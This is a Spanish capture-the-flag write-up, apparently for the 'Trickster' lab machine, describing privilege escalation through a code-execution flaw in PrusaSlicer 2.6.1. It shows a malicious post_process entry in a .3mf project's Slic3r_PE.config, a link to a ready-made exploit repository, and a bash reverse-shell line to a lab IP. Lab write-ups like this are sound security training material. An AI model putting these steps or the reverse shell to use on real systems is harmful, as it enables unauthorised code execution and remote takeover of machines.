 --loglevel N        Sets logging sensitivity. 0:fatal, 1:error, 2:warning, 3:info, 4:debug, 5:trace
                     For example. loglevel=2 logs fatal, error and warning level messages.
 --output ABCD, -o ABCD
                     The file where the output will be written (if not specified, it will be based on
                     the input file).
 --single-instance   If enabled, the command line arguments are sent to an existing instance of GUI
                     PrusaSlicer, or an existing PrusaSlicer window is activated. Overrides the
                     "single_instance" configuration value from application preferences.

Print options are processed in the following order:
  1) Config keys from the command line, for example --fill-pattern=stars
     (highest priority, overwrites everything below)
  2) Config files loaded with --load
  3) Config values loaded from amf or 3mf files

Run --help-fff / --help-sla to see the full listing of print options.

<br>La version del programa es vulnerable ; (PrusaSlicer-2.6.1)<br>
Vemos que se puede ejecutar código arbitrario observando la versión del programa en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a><br><br>Segun <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a>:<br>For the linux PoC, this CLI command is enough to execute the payload contained in the project. './prusa-slicer -s code-exec-linux.3mf'. After slicing, a new file '/tmp/hax' will be created. This particular PoC contains this 'post_process' entry in the 'Slic3r_PE.config' file:  
<br>El exploit  permite la ejecución de código arbitrario al manipular el archivo Slic3r_PE.config dentro de un proyecto .3mf de PrusaSlicer.<br>El archivo Slic3r_PE.config es donde se define la configuración del proyecto y contiene la entrada post_process, que se utiliza para ejecutar scripts después de generar el archivo G-code. En este caso, modificaremos esta entrada para incluir nuestro payload .<br>Slic3r_PE.config:<br>; post_process = "/usr/bin/id &gt; /tmp/hax #\necho 'arbitrary code execution! (x_x)'&gt;&gt; /tmp/hax #"
<br><br>En el siguiente repositorio de github ya tenemos un archivo .3mf malicioso<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/suce0155/prusaslicer_exploit.git" target="_blank">https://github.com/suce0155/prusaslicer_exploit.git</a><br>Lo descomprimimos y observamos el arbol de directorio de los archivos .3mf y como este ejecuta el codigo arbitrario;<br>Para extraerlo usamos unzip o 7z cualquiera vale;<br>total 64K
drwxrwxr-x 4 kali kali 4,0K feb 14 20:00 .
drwxrwxr-x 6 kali kali 4,0K feb 14 19:52 ..
-rw-rw-r-- 1 kali kali  39K feb 14 19:52 evil.3mf
-rw-rw-r-- 1 kali kali   42 feb 14 19:52 exploit.sh
drwxrwxr-x 5 kali kali 4,0K feb 14 20:00 Extracted
drwxrwxr-x 8 kali kali 4,0K feb 14 19:52 .git
-rw-rw-r-- 1 kali kali  369 feb 14 19:52 README.md
➜  prusaslicer_exploit git:(main) ✗ tree Extracted 
Extracted
├── 3D
│   └── 3dmodel.model
├── [Content_Types].xml
├── Metadata
│   ├── Slic3r_PE.config
│   ├── Slic3r_PE_model.config
│   └── thumbnail.png
└── _rels

4 directories, 5 files

<br>El exploit esta en el archivo Slic3r_PE.config que es el que ejecuta codigo arbitrario<br> cat Extracted/Metadata/Slic3r_PE.config | grep tmp
; post_process = "chmod +x /tmp/exploit.sh";"bash /tmp/exploit.sh"
<br>El exploit le da permiso a un archivo /tmp/exploit.sh y lo ejecuta con bash<br>Modificamos exploit.sh y lo movemos a /tmp<br>adam@trickster:~/prusaslicer_exploit$ cat /tmp/exploit.sh 
/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.232/2323 0&gt;&amp;1
<br><br><img alt="Pasted image 20250215133235.png" src="machines/trickster/imgs/pasted-image-20250215133235.png">]]></description><link>machines/trickster/2.privesc.html</link><guid isPermaLink="false">Machines/Trickster/2.PrivEsc.md</guid><pubDate>Sat, 15 Feb 2025 12:37:35 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250213163524.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="machines/trickster/imgs/pasted-image-20250213163524.png"&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>